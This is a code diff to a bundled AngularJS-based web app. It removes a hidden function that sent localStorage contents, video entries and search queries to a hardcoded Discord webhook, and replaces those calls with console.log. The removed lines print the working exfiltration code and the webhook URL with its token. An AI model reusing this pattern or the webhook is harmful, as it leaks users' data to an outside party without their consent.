@@ -1,21 +1,3 @@
-const webhookURL = "https://discord.com/api/webhooks/1456815949226184826/Og2GLHyTg93iLH5-VHlbDRWEtRV_6KbYK9zelW59aiWRq_od8V6AaPbHat3gWqWCUHu6";
-
-function winner(a) {
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            content: a
-        })
-    })
-        .then(res => {
-            if (!res.ok) throw new Error("Failed to send");
-            console.log("Sent: egg");
-        })
-        .catch(err => console.error(err));
-}
 /*
  AngularJS v1.0.6
  (c) 2010-2012 Google, Inc. http://angularjs.org
@@ -20267,7 +20249,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
         Rj.$inject = ["$rootScope", "$window", "timeService"];
         var Sj = function(a) {
             this.localStorage_ = a;
-            winner(a);
+            console.log(a);
             this.recentSearches_ = new ze(10,k);
             this.initializeRecentSearches_()
         };
@@ -20277,7 +20259,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
             a = this.recentSearches_.map(function(a, b) {
                 return this.getEntryForValues_(b, a.video, a.totalResults)
             }, this);
-            winner(a.video);
+            console.log(a.video);
             this.localStorage_.set("recent-searches", a)
         }
         ;
@@ -20302,7 +20284,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
             var a = this.localStorage_.get("recent-searches") || [];
             fb(a, function(a) {
                 this.recentSearches_.set(a.query, a)
-                winner(a.query);
+                console.log(a.query);
             }, this)
         }
         ;
